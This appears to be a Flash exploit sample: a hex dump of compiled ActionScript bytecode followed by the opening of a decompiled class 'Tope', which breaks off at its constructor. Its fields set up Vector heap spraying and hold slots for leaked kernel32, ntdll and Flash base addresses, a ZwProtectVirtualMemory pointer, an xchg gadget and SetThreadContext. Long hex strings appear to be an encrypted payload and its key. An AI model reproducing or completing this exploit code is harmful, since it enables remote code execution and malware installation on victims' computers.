63 08 d2 62 06 d2 62 0c 66 4b 61 4b d2 62 0c 62 		| c**b**b*fKaK*b*b |
08 61 4b d2 62 06 66 4b d2 62 0c 66 4b a0 25 ff 		| *aK*b*fK*b*fK*%* |
01 a8 63 0d d2 62 0d 66 4b 73 63 08 62 0a 62 0b 		| **c**b*fKsc*b*b* |
62 09 66 4b 62 08 aa 4f 5e 01 62 09 91 82 63 09 		| b*fKb**O^*b***c* |
62 09 62 0b 66 4c 15 96 ff ff 62 0a 48 00 00 08 		| b*b*fL****b*H*** |
01 02 09 0a 03 d0 30 47 00 00 09 04 02 09 0a 3e 		| ******0G*******> |
d0 30 d1 24 04 a4 12 03 00 00 24 00 48 d1 d0 66 		| *0*$******$*H**f |
1e 0f 13 00 00 d0 66 17 d0 66 1f 66 4b d1 d0 66 		| ******f**f*fK**f |
1e a1 24 04 a3 66 4b 48 d0 66 17 d0 66 1f 66 4b 		| **$**fKH*f**f*fK |
2d 0c d0 66 1e d1 a1 24 04 a3 a1 66 4b 48 00 00 		| -**f***$***fKH** |
0a 04 03 09 0a 41 d0 30 d1 24 04 a4 12 01 00 00 		| *****A*0*$****** |
47 d1 d0 66 1e 0f 17 00 00 d0 66 17 d0 66 1f 66 		| G**f******f**f*f |
4b d1 d0 66 1e a1 24 04 a3 d2 61 4b 10 16 00 00 		| K**f**$***aK**** |
d0 66 17 d0 66 1f 66 4b 2d 0c d0 66 1e d1 a1 24 		| *f**f*fK-**f***$ |
04 a3 a1 d2 61 4b 47 00 00 0b 03 04 09 0a 98 01 		| ****aKG********* |
d0 30 d0 d1 2f 04 a8 46 35 01 74 d6 10 2a 00 00 		| *0**/**F5*t***** |
09 d2 25 ff 01 a8 48 09 d2 24 08 a6 25 ff 01 a8 		| **%***H**$**%*** |
48 09 d2 24 10 a6 25 ff 01 a8 48 09 d2 24 18 a6 		| H**$**%***H**$** |
25 ff 01 a8 48 09 10 5b 00 00 d1 24 04 a4 d7 24 		| %***H**[***$***$ |
00 d3 1a 06 00 00 24 00 10 33 00 00 24 01 d3 1a 		| ******$**3**$*** |
06 00 00 24 01 10 26 00 00 24 02 d3 1a 06 00 00 		| ***$**&**$****** |
24 02 10 19 00 00 24 03 d3 1a 06 00 00 24 03 10 		| $*****$******$** |
0c 00 00 10 06 00 00 24 04 10 02 00 00 24 04 08 		| *******$*****$** |
03 1b b4 ff ff 04 8f ff ff 96 ff ff a0 ff ff aa 		| **************** |
ff ff b4 ff ff 24 00 48 00 00 0c 03 04 09 0a 9b 		| *****$*H******** |
01 d0 30 d1 24 02 a4 12 03 00 00 24 00 48 d0 d1 		| **0*$******$*H** |
2f 04 a8 46 35 01 74 d6 10 22 00 00 09 d2 2d 04 		| /**F5*t**"****-* |
a8 48 09 d2 24 08 a6 2d 04 a8 48 09 d2 24 10 a6 		| *H**$**-**H**$** |
2d 04 a8 48 09 10 60 00 00 09 10 5b 00 00 d1 24 		| -**H**`****[***$ |
04 a4 d7 24 00 d3 1a 06 00 00 24 00 10 33 00 00 		| ***$******$**3** |
24 01 d3 1a 06 00 00 24 01 10 26 00 00 24 02 d3 		| $******$**&**$** |
1a 06 00 00 24 02 10 19 00 00 24 03 d3 1a 06 00 		| ****$*****$***** |
00 24 03 10 0c 00 00 10 06 00 00 24 04 10 02 00 		| *$*********$**** |
00 24 04 08 03 1b b4 ff ff 04 97 ff ff 9d ff ff 		| *$************** |
a6 ff ff af ff ff b4 ff ff 24 00 48 00 00 0d 03 		| *********$*H**** |
06 09 0a d6 01 d0 30 24 00 74 63 04 d0 d1 2f 04 		| ******0$*tc***/* |
a8 46 35 01 74 d7 10 56 00 00 09 d3 2f 05 a8 d2 		| *F5*t**V****/*** |
25 ff 01 a8 a9 74 63 04 10 a4 00 00 09 d3 2f 06 		| %****tc*******/* |
a8 d2 25 ff 01 a8 24 08 a5 a9 74 63 04 10 8f 00 		| **%***$***tc**** |
00 09 d3 2f 07 a8 d2 25 ff 01 a8 24 10 a5 a9 74 		| ***/***%***$***t |
63 04 10 7a 00 00 09 d3 2d 0d a8 d2 25 ff 01 a8 		| c**z****-***%*** |
24 18 a5 a9 74 63 04 10 65 00 00 09 10 60 00 00 		| $***tc**e****`** |
d1 24 04 a4 63 05 24 00 62 05 1a 06 00 00 24 00 		| *$**c*$*b*****$* |
10 36 00 00 24 01 62 05 1a 06 00 00 24 01 10 28 		| *6**$*b*****$**( |
00 00 24 02 62 05 1a 06 00 00 24 02 10 1a 00 00 		| **$*b*****$***** |
24 03 62 05 1a 06 00 00 24 03 10 0c 00 00 10 06 		| $*b*****$******* |
00 00 24 04 10 02 00 00 24 04 08 05 1b af ff ff 		| **$*****$******* |
04 5e ff ff 70 ff ff 85 ff ff 9a ff ff af ff ff 		| *^**p*********** |
d0 d1 2f 04 a8 62 04 4f 36 02 47 00 00 0e 04 05 		| **/**b*O6*G***** |
09 0a 7f d0 30 24 00 74 63 04 24 00 82 d7 10 48 		| ***0$*tc*$****H |
00 00 09 d2 d3 66 4b 25 ff 01 a8 d2 d3 24 01 a0 		| *****fK%*****$** |
66 4b 25 ff 01 a8 24 08 a5 a9 d2 d3 24 02 a0 66 		| fK%***$*****$**f |
4b 25 ff 01 a8 24 10 a5 a9 d2 d3 24 03 a0 66 4b 		| K%***$*****$**fK |
25 ff 01 a8 24 18 a5 a9 74 63 04 d0 d1 d3 a0 62 		| %***$***tc*****b |
04 4f 36 02 d3 24 04 a0 82 d7 d3 24 03 a0 d2 66 		| *O6**$*****$***f |
4c 15 ad ff ff 10 10 00 00 09 d0 d1 d3 a0 d2 d3 		| L*************** |
66 4b 4f 39 02 d3 91 82 d7 d3 d2 66 4c 15 e8 ff 		| fKO9*******fL*** |
ff 47 00 00 0f 03 05 09 0a 3c d0 30 5d 08 4a 08 		| *G*******<*0]*J* |
00 80 08 d7 d3 60 5b 66 5c 61 5d 24 00 63 04 10 		| *****`[f\a]$*c** |
0d 00 00 09 d3 d2 62 04 46 5f 01 4f 60 01 c2 04 		| ******b*F_*O`*** |
62 04 d2 66 4c 15 ea ff ff d3 24 00 4f 60 01 d0 		| b**fL*****$*O`** |
d1 d3 4f 3a 02 47 00 00 10 03 05 09 0a 27 d0 30 		| **O:*G*******'*0 |
5d 08 4a 08 00 80 08 d7 d3 60 5b 66 5c 61 5d 24 		| ]*J******`[f\a]$ |
00 63 04 d3 d2 4f 61 01 d3 24 00 4f 5e 01 d0 d1 		| *c***Oa**$*O^*** |
d3 4f 3a 02 47 00 00 11 03 05 09 0a 3f d0 30 5d 		| *O:*G*******?*0] |
08 4a 08 00 80 08 d7 d3 60 5b 66 5c 61 5d d3 d2 		| *J******`[f\a]** |
4f 61 01 24 00 63 04 10 16 00 00 09 d0 d1 62 04 		| Oa*$*c********b* |
a0 46 37 01 d3 62 04 66 4b 13 02 00 00 27 48 c2 		| *F7**b*fK****'H* |
04 62 04 d3 66 4c 15 e1 ff ff 26 48 00 00 12 02 		| *b**fL****&H**** |
03 09 0a 2f d0 30 d1 2f 02 a8 82 d6 10 19 00 00 		| ***/*0*/******** |
09 d0 d2 46 35 01 2d 04 a8 25 cd b4 01 14 02 00 		| ***F5*-**%****** |
00 d2 48 d2 2d 0a a1 82 d6 d2 24 00 17 e0 ff ff 		| **H*-*****$***** |
24 00 48 00 00 13 06 0a 09 0c bd 01 d0 30 24 00 		| $*H**********0$* |
74 63 06 24 00 74 63 07 24 00 74 63 08 d1 d0 d1 		| tc*$*tc*$*tc**** |
d0 d1 24 3c a0 46 35 01 a0 25 80 01 a0 46 35 01 		| **$<*F5**%***F5* |
a0 74 2a 63 04 74 63 05 10 7e 00 00 09 d1 d0 62 		| *t*c*tc**~*****b |
05 24 0c a0 46 35 01 a0 74 63 06 d0 62 06 d2 46 		| *$**F5**tc**b**F |
3d 02 12 49 00 00 d1 d0 62 05 24 10 a0 46 35 01 		| =**I****b*$**F5* |
a0 74 63 07 d3 24 04 a2 62 07 a0 74 63 07 d0 62 		| *tc**$**b**tc**b |
07 46 35 01 74 63 08 10 12 00 00 09 62 07 24 04 		| *F5*tc******b*$* |
a0 74 63 07 d0 62 07 46 35 01 74 63 08 24 00 62 		| *tc**b*F5*tc*$*b |
08 13 e6 ff ff d0 62 08 2f 02 a8 46 3e 01 48 10 		| ******b*/**F>*H* |
0f 00 00 d0 30 5a 00 2a 63 09 2a 30 2b 6d 01 1d 		| ****0Z**c**0+m** |
08 09 62 05 24 14 a0 74 63 05 62 05 62 04 25 80 		| **b*$**tc*b*b*%* |
02 a0 15 76 ff ff 24 00 48 01 31 93 01 97 01 62 		| ***v**$*H*1****b |
63 00 14 06 0c 09 0a b0 01 d0 30 21 82 63 09 24 		| c*********0!*c*$ |
00 74 63 0a 24 00 74 63 0b d1 d0 d1 d0 d1 24 3c 		| *tc*$*tc******$< |
a0 46 35 01 a0 24 78 a0 46 35 01 a0 74 d7 d0 d3 		| *F5**$x*F5**t*** |
24 18 a0 46 35 01 74 63 04 d1 d0 d3 24 1c a0 46 		| $**F5*tc****$**F |
35 01 a0 74 63 05 d1 d0 d3 24 20 a0 46 35 01 a0 		| 5**tc****$ *F5** |
74 63 06 d1 d0 d3 24 24 a0 46 35 01 a0 74 63 07 		| tc****$$*F5**tc* |
24 00 82 63 08 10 45 00 00 09 d0 62 06 62 08 24 		| $**c**E****b*b*$ |
04 a2 a0 46 35 01 d1 a0 82 63 09 d0 62 09 d2 46 		| ***F5****c**b**F |
3d 02 12 22 00 00 d0 62 07 62 08 24 02 a2 a0 46 		| =**"***b*b*$***F |
38 01 74 63 0a d0 62 05 62 0a 24 04 a2 a0 46 35 		| 8*tc**b*b*$***F5 |
01 d1 a0 74 2a 63 0b 48 62 08 91 82 63 08 62 08 		| ***t*c*Hb***c*b* |
62 04 15 b3 ff ff 24 00 48 00 00 15 03 06 09 0a 		| b*****$*H******* |
6c d0 30 24 00 63 05 d2 d3 b0 2a 11 08 00 00 29 		| l*0$*c*********) |
d2 d1 66 4c a0 d3 af 12 03 00 00 24 00 48 d2 74 		| **fL*******$*H*t |
63 04 10 3d 00 00 09 24 00 63 05 10 19 00 00 09 		| c**=***$*c****** |
d0 62 04 62 05 a0 46 37 01 d1 62 05 66 4b 13 04 		| *b*b**F7**b*fK** |
00 00 10 0b 00 00 c2 05 62 05 d1 66 4c 15 de ff 		| ********b**fL*** |
ff 62 05 d1 66 4c 14 03 00 00 62 04 48 62 04 91 		| *b**fL****b*Hb** |
74 63 04 62 04 d3 15 bc ff ff 24 00 48 00 00 16 		| tc*b******$*H*** |
04 06 09 0a 53 d0 30 20 82 d6 5d 08 4a 08 00 82 		| ****S*0 **]*J*** |
d7 d1 66 4c 82 63 04 24 00 82 63 05 d3 60 5b 66 		| **fL*c*$**c**`[f |
5c 61 64 10 27 00 00 09 d1 62 05 46 59 01 d1 62 		| \ad*'****b*FY**b |
05 24 01 a0 46 59 01 a0 82 d6 d3 5d 5a d2 24 10 		| *$**FY*****]Z*$* |
46 5a 02 4f 65 01 62 05 24 02 a0 82 63 05 62 05 		| FZ*Oe*b*$***c*b* |
62 04 15 d1 ff ff d3 48 00 00 17 05 2e 09 0c 90 		| b******H****.*** |
0f d0 30 24 00 74 d6 24 00 74 d7 24 00 74 63 04 		| **0$*t*$*t*$*tc* |
24 00 74 63 05 24 00 74 63 06 24 00 74 63 07 24 		| $*tc*$*tc*$*tc*$ |
00 74 63 08 24 00 74 63 09 24 00 74 63 0a 24 00 		| *tc*$*tc*$*tc*$* |
74 63 0b 24 00 74 63 0c 24 00 74 63 0d 24 00 74 		| tc*$*tc*$*tc*$*t |
63 0e 24 00 74 63 0f 24 00 74 63 10 24 00 74 63 		| c*$*tc*$*tc*$*tc |
11 24 00 74 63 12 24 00 74 63 13 20 85 63 14 24 		| *$*tc*$*tc* *c*$ |
00 74 63 15 24 00 74 63 16 24 00 74 63 17 24 00 		| *tc*$*tc*$*tc*$* |
63 19 24 00 63 1a 24 00 63 1b 24 00 63 1c 24 00 		| c*$*c*$*c*$*c*$* |
74 63 1e 24 00 74 63 1f 24 00 74 63 20 24 00 74 		| tc*$*tc*$*tc $*t |
63 21 24 00 63 25 20 80 08 63 26 24 00 74 63 27 		| c!$*c% **c&$*tc' |
24 00 74 63 28 21 82 63 29 24 00 74 63 2a 21 82 		| $*tc(!*c)$*tc*!* |
63 2b d1 82 63 18 24 00 63 1d 2d 0e 82 63 22 25 		| c+**c*$*c*-**c"% |
e0 1f 82 63 23 2d 0a 82 63 24 2d 0f 74 63 0c d0 		| ***c#-**c$-*tc** |
66 1a 76 2a 12 07 00 00 29 d0 66 1d 2d 04 ab 12 		| f*v*****)*f*-*** |
07 00 00 d0 66 15 4f 66 00 47 d0 66 1d 24 00 14 		| ****f*Of*G*f*$** |
d7 00 00 24 00 63 19 10 37 00 00 09 d0 66 17 62 		| ***$*c**7****f*b |
19 66 4b 60 52 60 03 53 01 87 66 4c d0 66 2c 0e 		| *fK`R`*S**fL*f,* |
04 00 00 10 24 00 00 10 0f 00 00 d0 30 5a 00 2a 		| ****$*******0Z** |
63 2c 2a 30 2b 6d 01 1d 08 2c 62 19 24 01 a0 73 		| c,*0+m***,b*$**s |
63 19 62 19 d0 66 2d 15 c0 ff ff 62 19 d0 66 2d 		| c*b**f-****b**f- |
14 01 00 00 47 24 01 63 1a 24 ff 63 1c d0 66 17 		| ****G$*c*$*c**f* |
62 19 66 4b 25 80 20 62 1a a2 24 04 a3 24 02 a1 		| b*fK%* b**$**$** |
2d 10 61 4b 24 00 63 25 10 24 00 00 09 d0 66 17 		| -*aK$*c%*$****f* |
62 25 66 4b 66 67 2d 10 14 12 00 00 62 25 73 63 		| b%fKfg-*****b%sc |
1c 62 0c 25 80 20 a0 74 63 0c 10 0d 00 00 c2 25 		| *b*%* *tc******% |
62 25 d0 66 17 66 4c 15 d1 ff ff 62 1c 24 ff 14 		| b%*f*fL****b*$** |
01 00 00 47 d0 62 0c 61 1e d0 62 1c 61 1f d0 62 		| ***G*b*a**b*a**b |
22 d0 66 2c 4f 36 02 d0 2a 63 2c 66 1d 91 63 2d 		| "*f,O6***c,f**c- |
62 2c 62 2d 61 1d 08 2d 08 2c d0 66 1d 24 01 14 		| b,b-a**-*,*f*$** |
66 01 00 d0 66 1e 25 f8 1f a0 25 80 20 a0 74 63 		| f***f*%***%* *tc |
09 24 00 63 19 10 f5 00 00 09 62 09 62 19 25 80 		| *$*c******b*b*%* |
20 a2 a0 2d 0a a4 24 00 ab 2a 12 13 00 00 29 d0 		|  **-**$*******)* |
62 09 62 19 25 80 20 a2 a0 46 35 01 d0 66 2c ab 		| b*b*%* **F5**f,* |
96 2a 12 15 00 00 29 d0 62 09 62 19 25 80 20 a2 		| ******)*b*b*%* * |
a0 24 04 a0 46 35 01 62 23 ab 96 12 1a 00 00 62 		| *$**F5*b#******b |
09 2d 0a a0 74 63 09 62 19 24 00 13 06 00 00 62 		| *-**tc*b*$*****b |
19 93 73 63 19 10 7a 00 00 d0 62 09 62 19 25 80 		| **sc**z***b*b*%* |
20 a2 a0 24 04 a0 46 35 01 62 23 ab 2a 12 17 00 		|  **$**F5*b#***** |
00 29 d0 62 09 62 19 25 80 20 a2 a0 24 04 24 11 		| *)*b*b*%* **$*$* |
a2 a0 46 35 01 24 00 af 2a 12 28 00 00 29 d0 62 		| **F5*$****(**)*b |
09 62 19 25 80 20 a2 a0 24 04 24 11 a2 a0 46 35 		| *b*%* **$*$***F5 |
01 d0 62 09 62 19 25 80 20 a2 a0 24 04 24 64 a2 		| **b*b*%* **$*$d* |
a0 46 35 01 ab 12 1a 00 00 d0 62 09 62 19 25 80 		| *F5*******b*b*%* |
20 a2 a0 24 04 24 11 a2 a0 46 35 01 74 63 09 10 		|  **$*$***F5*tc** |
23 00 00 10 0f 00 00 d0 30 5a 01 2a 63 2c 2a 30 		| #*******0Z**c,*0 |
2b 6d 01 1d 08 2c 62 19 24 01 a0 73 63 19 62 19 		| +m***,b*$**sc*b* |
62 24 15 03 ff ff 62 19 62 24 14 01 00 00 47 62 		| b$****b*b$****Gb |
09 2f 04 a8 74 2a 63 09 74 63 10 d0 62 10 61 21 		| */**t*c*tc**b*a! |
d0 d0 62 09 46 35 01 2f 02 a8 46 3e 01 74 2a 63 		| **b*F5*/**F>*t*c |
11 24 00 14 0a 00 00 60 4d 2c 7d 2c 7e 4f 4e 02 		| *$*****`M,},~ON* |
47 d0 62 11 61 20 d0 2a 63 2c 66 1d 91 63 2d 62 		| G*b*a **c,f**c-b |
2c 62 2d 61 1d 08 2d 08 2c d0 66 1d 24 02 14 2e 		| ,b-a**-*,*f*$**. |
00 00 d0 d0 66 20 2c 7f 24 00 46 3f 03 74 2a 63 		| ****f ,$*F?*t*c |
04 24 00 14 01 00 00 47 d0 62 04 61 22 d0 2a 63 		| *$*****G*b*a"**c |
2c 66 1d 91 63 2d 62 2c 62 2d 61 1d 08 2d 08 2c 		| ,f**c-b,b-a**-*, |
d0 66 1d 24 03 14 2d 00 00 d0 d0 66 22 2c 80 01 		| *f*$**-****f",** |
24 00 46 3f 03 74 d7 d3 24 00 14 01 00 00 47 d0 		| $*F?*t**$*****G* |
d3 61 23 d0 2a 63 2c 66 1d 91 63 2d 62 2c 62 2d 		| *a#**c,f**c-b,b- |
61 1d 08 2d 08 2c d0 66 1d 24 04 14 2d 00 00 d0 		| a**-*,*f*$**-*** |
d0 66 23 2c 81 01 46 40 02 74 2a 63 0a 24 00 14 		| *f#,**F@*t*c*$** |
01 00 00 47 d0 62 0a 61 24 d0 2a 63 2c 66 1d 91 		| ***G*b*a$**c,f** |
63 2d 62 2c 62 2d 61 1d 08 2d 08 2c d0 66 1d 24 		| c-b,b-a**-*,*f*$ |
05 14 85 00 00 d0 d0 66 23 24 3c a0 46 35 01 74 		| *******f#$<*F5*t |
63 0d d0 d0 66 23 62 0d a0 25 88 02 a0 46 35 01 		| c***f#b**%***F5* |
74 63 0e d0 d0 66 23 62 0d a0 25 84 02 a0 46 35 		| tc***f#b**%***F5 |
01 74 63 0d d0 66 23 62 0d a0 74 63 0d d0 66 23 		| *tc**f#b**tc**f# |
62 0e a0 74 63 0e 5d 08 4a 08 00 80 08 2a 63 26 		| b**tc*]*J*****c& |
60 5b 66 5c 61 5d 62 26 2d 11 4f 60 01 d0 62 26 		| `[f\a]b&-*O`**b& |
62 0d 62 0e 46 41 03 74 2a 63 0f 24 00 14 01 00 		| b*b*FA*t*c*$**** |
00 47 d0 62 0f 61 25 d0 2a 63 2c 66 1d 91 63 2d 		| *G*b*a%**c,f**c- |
62 2c 62 2d 61 1d 08 2d 08 2c d0 66 1d 24 06 14 		| b,b-a**-*,*f*$** |
8a 00 00 d0 d0 d0 66 22 2c 82 01 46 40 02 61 26 		| ******f",**F@*a& |
d0 66 26 24 00 14 61 00 00 24 00 74 63 28 d0 66 		| *f&$**a**$*tc(*f |
22 74 63 27 24 00 74 63 28 10 3b 00 00 09 d0 d0 		| "tc'$*tc(*;***** |
62 27 2c 7f 62 28 46 3f 03 61 22 d0 66 22 24 00 		| b',b(F?*a"*f"$* |
14 04 00 00 10 1a 00 00 d0 d0 d0 66 22 2c 82 01 		| ***********f",** |
46 40 02 61 26 d0 66 26 24 00 13 04 00 00 10 0e 		| F@*a&*f&$******* |
00 00 62 28 91 74 63 28 62 28 24 64 15 bd ff ff 		| **b(*tc(b($d**** |
d0 66 26 24 00 14 01 00 00 47 d0 2a 63 2c 66 1d 		| *f&$*****G**c,f* |
91 63 2d 62 2c 62 2d 61 1d 08 2d 08 2c d0 66 1d 		| *c-b,b-a**-*,*f* |
24 07 14 8a 02 00 d0 66 21 74 63 09 d0 62 09 46 		| $******f!tc**b*F |
35 01 74 63 07 d0 66 1e 25 f8 01 a0 74 63 06 d0 		| 5*tc**f*%***tc** |
66 1e 74 63 0c d0 66 24 74 63 0a 62 06 82 63 29 		| f*tc**f$tc*b**c) |
d0 66 17 62 1c 66 4b 62 06 62 0c a1 24 04 a3 24 		| *f*b*fKb*b**$**$ |
02 a1 24 04 a1 62 29 2f 08 a8 61 4b d0 66 17 62 		| **$**b)/**aK*f*b |
1c 66 4b 62 06 62 0c a1 24 04 a3 93 24 04 a1 25 		| *fKb*b**$***$**% |
80 60 61 4b d0 66 17 62 1c 66 4b 62 06 62 0c a1 		| *`aK*f*b*fKb*b** |
24 04 a3 62 0a 61 4b d0 66 17 62 1c 66 4b 62 06 		| $**b*aK*f*b*fKb* |
62 0c a1 24 04 a3 24 01 a0 62 29 24 1c a0 61 4b 		| b**$**$**b)$**aK |
d0 66 17 62 1c 66 4b 62 06 62 0c a1 24 04 a3 24 		| *f*b*fKb*b**$**$ |
02 a0 2f 03 61 4b d0 66 17 62 1c 66 4b 62 06 62 		| **/*aK*f*b*fKb*b |
0c a1 24 04 a3 24 03 a0 62 06 24 18 a1 61 4b d0 		| **$**$**b*$**aK* |
66 17 62 1c 66 4b 62 06 62 0c a1 24 04 a3 24 04 		| f*b*fKb*b**$**$* |
a0 62 06 24 14 a1 61 4b d0 66 17 62 1c 66 4b 62 		| *b*$**aK*f*b*fKb |
06 62 0c a1 24 04 a3 24 05 a0 24 40 61 4b d0 66 		| *b**$**$**$@aK*f |
17 62 1c 66 4b 62 06 62 0c a1 24 04 a3 24 06 a0 		| *b*fKb*b**$**$** |
62 06 24 1c a1 61 4b d0 66 17 62 1c 66 4b 62 29 		| b*$**aK*f*b*fKb) |
62 0c a1 24 04 a3 24 07 a0 2d 12 61 4b d0 66 17 		| b**$**$**-*aK*f* |
62 1c 66 4b 62 29 62 0c a1 24 04 a3 24 08 a0 2f 		| b*fKb)b**$**$**/ |
09 61 4b d0 66 17 62 1c 66 4b 62 29 62 0c a1 24 		| *aK*f*b*fKb)b**$ |
04 a3 24 09 a0 62 09 61 4b d0 66 17 62 1c 66 4b 		| **$**b*aK*f*b*fK |
62 29 62 0c a1 24 04 a3 24 0a a0 2d 13 61 4b d0 		| b)b**$**$**-*aK* |
66 17 62 1c 66 4b 62 29 62 0c a1 24 04 a3 24 0b 		| f*b*fKb)b**$**$* |
a0 62 07 61 4b d0 66 17 62 1c 66 4b 62 29 62 0c 		| *b*aK*f*b*fKb)b* |
a1 24 04 a3 24 0c a0 2f 0a 61 4b d0 66 17 62 1c 		| *$**$**/*aK*f*b* |
66 4b 62 29 62 0c a1 24 04 a3 24 0d a0 d0 66 1e 		| fKb)b**$**$***f* |
24 08 a1 61 4b d0 66 17 62 1c 66 4b 62 29 62 0c 		| $**aK*f*b*fKb)b* |
a1 24 04 a3 24 0e a0 2d 13 61 4b d0 66 17 62 1c 		| *$**$**-*aK*f*b* |
66 4b 62 29 62 0c a1 24 04 a3 24 0f a0 d0 66 2c 		| fKb)b**$**$***f, |
61 4b d0 66 17 62 1c 66 4b 62 29 62 0c a1 24 04 		| aK*f*b*fKb)b**$* |
a3 24 10 a0 2f 0b 61 4b d0 66 17 62 1c 66 4b 62 		| *$**/*aK*f*b*fKb |
29 62 0c a1 24 04 a3 24 11 a0 2d 14 61 4b d0 66 		| )b**$**$**-*aK*f |
17 62 1c 66 4b 62 29 62 0c a1 24 04 a3 24 11 a0 		| *b*fKb)b**$**$** |
2d 14 61 4b d0 66 17 62 1c 66 4b 62 06 62 0c a1 		| -*aK*f*b*fKb*b** |
24 04 a3 24 1c a0 d0 66 25 61 4b 24 1d 74 63 2a 		| $**$***f%aK$*tc* |
5d 08 4a 08 00 82 2a 63 2b 60 5b 66 5c 61 64 62 		| ]*J****c+`[f\adb |
2b d0 2c 83 01 46 33 01 4f 68 01 62 2b d0 66 26 		| +*,**F3*Oh*b+*f& |
4f 69 01 62 2b d0 2c 85 01 46 33 01 4f 68 01 62 		| Oi*b+*,**F3*Oh*b |
2b d0 d0 66 12 46 33 01 4f 68 01 d0 62 29 62 2a 		| +**f*F3*Oh**b)b* |
24 04 a2 a0 62 2b 4f 3a 02 d0 62 09 62 06 4f 36 		| $***b+O:**b*b*O6 |
02 d0 66 10 4f 55 00 d0 2d 04 61 1d d0 4f 31 00 		| **f*OU**-*a**O1* |
47 02 fb 01 96 02 9a 02 62 63 e9 03 c2 05 c6 05 		| G*******bc****** |
62 63 00 18 02 01 01 08 23 d0 30 65 00 60 0d 30 		| bc******#*0e*`*0 |
60 6a 30 60 6b 30 60 6c 30 60 6d 30 60 0b 30 60 		| `j0`k0`l0`m0`*0` |
0b 58 00 1d 1d 1d 1d 1d 1d 68 0a 47 00 00 	         	| *X*******h*G** |

// -----------------------
// Decoded Action Script
// -----------------------

package {
    import __AS3__.vec.*;
    import flash.utils.*;
    import flash.events.*;
    import flash.display.*;
    import flash.media.*;
    import flash.text.*;
    import flash.net.*;
    import flash.external.*;

    public class Tope extends Sprite {

        public var ss:Vector.<Object>;
        private var delay:uint = 1000;
        private var snd:Sound;
        private var m_dump7:String = "5467ebaa5baab6c9d945321215d4f075251af2717b30cde85bdcede9d17bfb6eff2aa25e9b34ad7a1670ab5abc27b19273f17f197765196c0299b84f190b848f1d39eb95428d0e631343348b378f8d1246d2f5b33a4efff9a47f941a3eb02b290b2ac6732987f56d8c442af410beccbeac3cbbeaead69d33b790d0a8c32381ae11e4d7fe6802d9784ccf567380c1f9147f2e9577e0d01e392bb36d2421987f981c6745abbc5a57fa4d5f33047c95fa99882b23fd68b68b22ff25144978ff38499785a0bdf37635dbfddfd38264dcc3c0dd5f248dc26fd97fbf811f53edbb781c657928a6ea83b9420a139d31f8437ff98c66407b96acd9fc171dca9db15142f1379b269a5d6c3d3e806e94a5e442b1b2f4e8bff536654e2ca1a64e6df678ceeb58935219a7b2765068ebe20bc6675ef7f568f10a57fd153294ebacaf1e483ba01b657fe4b91ea025cb44c6b528dadd3ac4983bfcdd0fe9855217e9f4edc9d653b73f2f64f93bc76512194edad58fef5b96225676d0900e20b52e66c2c1d5d6b39080b8d021c1dd4511066957acead8e861e090401ff8c7f2865f845db36240d2f30194e775db98c883a1b64bcf93559c07c5ef6fb3c6da00b18614e6228747294ccb546cb8abe22bc9e15584afc4a249723ce594d9bc6d5e900db1ad4a3bd461cf7a060700bc580cd2cd238ff95b009ad81ed00abcf05d2632eb089f6e748983955f6b5104014fec4a138c6977d78c50a26a79166da8cbc9042a6f60a4139dffee2998c33902b254367b4344982ef09ec509d074aff79b47f6141628a53a73da9193ad5259e42387aeeaa6652994b4bdef90dc764091e477993eca3cb821475a0f1450b0956814cb256f357f71380c0d7f5718126a3410cb835721ec5bbfec69f57bcd56d04ee8a606da46a653bf43b12c0422511956ea79c98fce1afbd0c64ca3148b6e442e44301d3bb8b93587ecc2a86b48c406930978bad9cb0d5c5e627c87fd07eebb3305b343468bda57e0083e558e3155b02770e8dd5a1f22a810aec453be2430a200b28da859cecbe12aa384c9419e6f663c8fbae50340593babd6b2b0aab93a62623fe55a8ed41e98c613b5fd26435701b2dca49126f092f59e848692c411a6be306a2d5b6ebdabc4786fb7012a63b67e9d521a6043592fbba03f0de5f6ad22498dcc8fa2fce9e56fcfa4115caab30947d2a882be6b33d38ffc3ec5f1c2597ba7ef57d640584ad0ffbbf18158aabe762864064e155054238a8e2e097285f94f3a4f14866e739d4e54bcbf5f6d4491a8f4637c5f698ecc43f11b50354b8e85ce4790b06c714f40791175952a8c8d8b8b79b1ccebe03e6dcfd2da3aacea36222a6cf09a04726411b846f808058fb35abd407349a41e83c9bac9c3b4b7fd3f88d11d429840bc09e73088568d871d96585335258b0764f7b830d8f9a976d3d8ec309740cf8c2327286229dc8cea287d33761f4336faa5754028c4a1371278df3e8be864ac17737a0f562c287d2bbfdd3da83d5040d019d92dfe430f43b5126562e60615b1c741f07af8c711563de208b266e9a865ab1573e780725bbc160f4d22165b128bee7108c30385990f9f9153e9a402ed0961b240260d3dd7ab14585488c6779d64c93bd7176157a2152c41455518b5004a84df6a4ed1ec0bec6cf1fb60188bbe93385caaa0902d9a2a12bf5c06cbc85f9e9cd523eb6e54cca35a2498e3791cefabd8166c406bf053de550c26089cb02c879d89b817b258d2e7d45885ca387edebd0097ffa830892d2a9665047942ca87f82009cf1caafa13490a9e0b657fed2a6669659c80dac79e4a5ec540bd645b5d503880b642992ea8c1b0f3846c648f0a0b2a7fd52c1517f96a0a34b59089b347b58f98fc89b5b3824c6e600675a502eac5092d";
        private var m_keys:String = "2eb31f09e9a77a0fde5a1a23eff067a24a98840ceabf048497b3";
        private var m_trg:String = "42ee4b892986a326ea5aad1017918a235b0c5e940c449a9d40a585ce8f7b9a0ae8b6f4f0af281700b2064a6015fc0f16389e3bb2881c7d8a66f795488b3433d998be87f7992abb833329d2e086f134a908510b82dec1db1f822db7bf25cd27e9983aaf2587188597a0dc02d58017a28899dfa5a68d6b7797a4ff008e9dde631865690065d4958b51209335a5fe4f4f25ad74a21ff75a49ba1d85c88382baaa283e7eba819b33868d30a02c7983f41566b7560e51ed24acc663c38a1169ecefeca6248054fdc51e35e024f97a7673f464d9da093c94cdb2c8f53f2edaab1f51ae62d8560ef63c87f642b1b19cf6e756439a9d25f4c017ff7c4db8e757b6be7c6f";
        private var work:Timer;
        public var s:Vector.<Object>;
        public var tf:TextField;
        private var found:Boolean = false;
        private var m_mark:Boolean = false;
        private var repeat:uint = 0x1000;
        public var m_status = 0;
        private var m_longArrBase:uint = 0;
        private var m_longArrIdx:uint = 0;
        private var m_flashBase:uint = 0;
        private var m_flashVirtual:uint = 0;
        private var m_kernel32Base:uint = 0;
        private var m_ntdllBase:uint = 0;
        private var m_ZwProtectAddr:uint = 0;
        private var m_xchgInstAddr:uint = 0;
        private var m_SetThreadContext:uint = 0;
        public var m_iver:String;
        public var org:String = "vector";
        public var m_mySo:SharedObject;
        public var m_Ostring:String = "Pidj7gbU";
        public var m_rawLen = 0;
        public var m_suf = 90466;

        public function Tope():void{
